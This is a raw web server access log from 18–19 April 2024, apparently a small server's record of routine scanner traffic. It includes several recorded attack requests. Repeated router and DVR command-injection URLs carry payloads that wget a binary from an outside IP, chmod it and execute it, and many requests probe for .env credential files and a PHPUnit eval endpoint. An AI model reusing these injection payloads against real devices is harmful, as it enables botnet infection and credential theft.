122.173.255.29 - - [18/Apr/2024:06:21:14 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
122.173.255.29 - - [18/Apr/2024:06:23:13 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
122.173.255.29 - - [18/Apr/2024:06:24:19 +0000] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
122.173.255.29 - - [18/Apr/2024:06:26:20 +0000] "GET / HTTP/1.1" 200 317 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.142.182.118 - - [18/Apr/2024:07:09:18 +0000] "GET / HTTP/1.1" 200 188 "-" "-"
143.110.222.166 - - [18/Apr/2024:07:10:04 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
78.153.140.179 - - [18/Apr/2024:07:54:41 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [18/Apr/2024:07:59:50 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.224.128.43 - - [18/Apr/2024:08:19:51 +0000] "GET / HTTP/1.1" 200 317 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [18/Apr/2024:08:59:53 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
179.43.190.218 - - [18/Apr/2024:09:02:23 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
83.97.73.245 - - [18/Apr/2024:09:10:36 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 280 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [18/Apr/2024:10:08:10 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
128.14.237.9 - - [18/Apr/2024:10:13:00 +0000] "GET / HTTP/1.1" 200 188 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
128.14.237.9 - - [18/Apr/2024:10:13:05 +0000] "GET /favicon.ico HTTP/1.1" 404 363 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
128.14.237.9 - - [18/Apr/2024:10:13:06 +0000] "GET /robots.txt HTTP/1.1" 404 363 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
128.14.237.9 - - [18/Apr/2024:10:13:06 +0000] "GET /sitemap.xml HTTP/1.1" 404 363 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
83.97.73.245 - - [18/Apr/2024:10:28:29 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 382 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
107.170.228.43 - - [18/Apr/2024:10:42:29 +0000] "GET /manager/html HTTP/1.1" 404 363 "-" "Mozilla/5.0 zgrab/0.x"
143.110.222.166 - - [18/Apr/2024:11:18:35 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
143.110.222.166 - - [18/Apr/2024:12:01:12 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
45.79.149.111 - - [18/Apr/2024:12:09:18 +0000] "GET /MGSu HTTP/1.1" 404 382 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
45.79.149.111 - - [18/Apr/2024:12:09:18 +0000] "GET /cQHa HTTP/1.1" 404 382 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
162.243.146.47 - - [18/Apr/2024:12:16:12 +0000] "GET /ReportServer HTTP/1.1" 404 363 "-" "Mozilla/5.0 zgrab/0.x"
185.242.226.10 - - [18/Apr/2024:12:45:19 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
143.110.222.166 - - [18/Apr/2024:13:12:59 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.224.128.43 - - [18/Apr/2024:14:00:19 +0000] "GET / HTTP/1.1" 200 317 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [18/Apr/2024:14:01:48 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
45.142.182.118 - - [18/Apr/2024:14:20:33 +0000] "GET / HTTP/1.1" 200 188 "-" "-"
80.94.92.60 - - [18/Apr/2024:14:27:17 +0000] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=echo%3Bcd%20%2Fvar%2Ftmp%3Bwget%20http%3A%2F%2F94.156.79.129%2Farm7%3Bchmod%20777%20arm7%3B%20.%2Farm7%200daydvr%3B HTTP/1.1" 404 382 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
163.172.4.129 - - [18/Apr/2024:14:53:54 +0000] "GET /.env HTTP/1.1" 404 419 "-" "python-requests/2.27.1"
163.172.4.129 - - [18/Apr/2024:14:53:54 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
163.172.4.129 - - [18/Apr/2024:14:53:54 +0000] "POST /core/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
163.172.4.129 - - [18/Apr/2024:14:53:54 +0000] "GET /core/.env HTTP/1.1" 404 419 "-" "python-requests/2.27.1"
163.172.4.129 - - [18/Apr/2024:14:53:55 +0000] "GET /.env HTTP/1.1" 404 419 "-" "python-requests/2.27.1"
163.172.4.129 - - [18/Apr/2024:14:53:55 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
163.172.4.129 - - [18/Apr/2024:14:53:55 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
163.172.4.129 - - [18/Apr/2024:14:53:55 +0000] "POST /core/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
163.172.4.129 - - [18/Apr/2024:14:53:55 +0000] "POST /core/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
163.172.4.129 - - [18/Apr/2024:14:53:55 +0000] "GET /core/.env HTTP/1.1" 404 419 "-" "python-requests/2.27.1"
163.172.4.129 - - [18/Apr/2024:14:53:56 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
163.172.4.129 - - [18/Apr/2024:14:53:56 +0000] "POST /core/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
179.43.190.218 - - [18/Apr/2024:14:57:26 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
94.156.10.184 - - [18/Apr/2024:14:58:23 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:14:58:24 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.191.126.213 - - [18/Apr/2024:15:09:38 +0000] "GET / HTTP/1.1" 200 188 "-" "-"
35.240.121.17 - - [18/Apr/2024:15:09:52 +0000] "GET / HTTP/1.1" 200 317 "-" "python-requests/2.31.0"
143.110.222.166 - - [18/Apr/2024:15:20:40 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
57.129.23.166 - - [18/Apr/2024:15:32:33 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [18/Apr/2024:15:32:33 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
80.94.92.60 - - [18/Apr/2024:15:38:03 +0000] "GET / HTTP/1.1" 200 317 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [18/Apr/2024:16:14:17 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
94.156.10.184 - - [18/Apr/2024:16:33:03 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:04 +0000] "GET /conf/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:04 +0000] "GET /wp-content/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:05 +0000] "GET /wp-admin/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:05 +0000] "GET /library/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:06 +0000] "GET /new/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:06 +0000] "GET /vendor/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:07 +0000] "GET /old/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:07 +0000] "GET /local/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:08 +0000] "GET /api/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:08 +0000] "GET /blog/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:09 +0000] "GET /crm/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:09 +0000] "GET /admin/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:10 +0000] "GET /laravel/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:10 +0000] "GET /app/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:11 +0000] "GET /app/config/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:11 +0000] "GET /apps/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:12 +0000] "GET /audio/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:12 +0000] "GET /cgi-bin/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:13 +0000] "GET /backend/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:13 +0000] "GET /src/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:14 +0000] "GET /base/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:14 +0000] "GET /core/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:15 +0000] "GET /vendor/laravel/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:15 +0000] "GET /storage/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:16 +0000] "GET /protected/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:16 +0000] "GET /newsite/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:17 +0000] "GET /www/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:17 +0000] "GET /sites/all/libraries/mailchimp/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:18 +0000] "GET /database/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:18 +0000] "GET /public/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:19 +0000] "GET /128.199.26.243/.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:19 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
94.156.10.184 - - [18/Apr/2024:16:33:20 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 419 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
41.190.70.254 - - [18/Apr/2024:16:45:59 +0000] "GET / HTTP/1.1" 200 188 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
143.110.222.166 - - [18/Apr/2024:16:56:37 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
44.220.188.75 - - [18/Apr/2024:17:02:14 +0000] "GET / HTTP/1.1" 200 317 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/50.0.3100.113 Safari/537.32"
57.129.23.166 - - [18/Apr/2024:17:17:53 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [18/Apr/2024:17:17:53 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [18/Apr/2024:17:33:42 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [18/Apr/2024:17:33:42 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
179.43.190.218 - - [18/Apr/2024:18:10:59 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
121.179.54.77 - - [18/Apr/2024:18:12:32 +0000] "GET / HTTP/1.1" 200 188 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.224.128.43 - - [18/Apr/2024:18:49:03 +0000] "GET / HTTP/1.1" 200 317 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [18/Apr/2024:19:01:31 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
37.49.227.60 - - [18/Apr/2024:19:01:56 +0000] "GET / HTTP/1.1" 200 244 "-" "-"
179.43.190.218 - - [18/Apr/2024:19:10:31 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
185.191.126.213 - - [18/Apr/2024:19:10:46 +0000] "GET / HTTP/1.1" 200 188 "-" "-"
57.129.23.166 - - [18/Apr/2024:19:26:07 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [18/Apr/2024:19:26:08 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [18/Apr/2024:20:21:00 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
87.236.176.163 - - [18/Apr/2024:21:04:31 +0000] "GET / HTTP/1.1" 200 280 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
45.79.168.172 - - [18/Apr/2024:21:43:00 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 zgrab/0.x"
57.129.23.166 - - [18/Apr/2024:21:45:32 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
57.129.23.166 - - [18/Apr/2024:21:45:32 +0000] "POST / HTTP/1.1" 405 401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.79.181.251 - - [18/Apr/2024:21:49:07 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
143.110.222.166 - - [18/Apr/2024:21:58:23 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
179.43.190.218 - - [18/Apr/2024:22:25:02 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk) HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
143.110.222.166 - - [18/Apr/2024:23:01:23 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
172.214.141.49 - - [18/Apr/2024:23:18:18 +0000] "GET / HTTP/1.1" 200 244 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0"
185.200.158.210 - - [18/Apr/2024:23:19:53 +0000] "GET / HTTP/1.1" 200 188 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
5.181.190.250 - - [18/Apr/2024:23:22:54 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F5.181.190.250%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+shk) HTTP/1.1" 404 363 "-" "Go-http-client/1.1"
162.142.125.222 - - [18/Apr/2024:23:47:29 +0000] "GET / HTTP/1.1" 200 188 "-" "-"
162.142.125.222 - - [18/Apr/2024:23:47:33 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.222 - - [18/Apr/2024:23:47:34 +0000] "GET /favicon.ico HTTP/1.1" 404 382 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
172.104.210.105 - - [18/Apr/2024:23:52:13 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 zgrab/0.x"
172.104.11.4 - - [18/Apr/2024:23:52:25 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
143.110.222.166 - - [19/Apr/2024:00:00:25 +0000] "GET / HTTP/1.1" 200 261 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
57.129.23.166 - - [19/Apr/2024:00:03:06 +0000] "GET /.env HTTP/1.1" 404 419 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
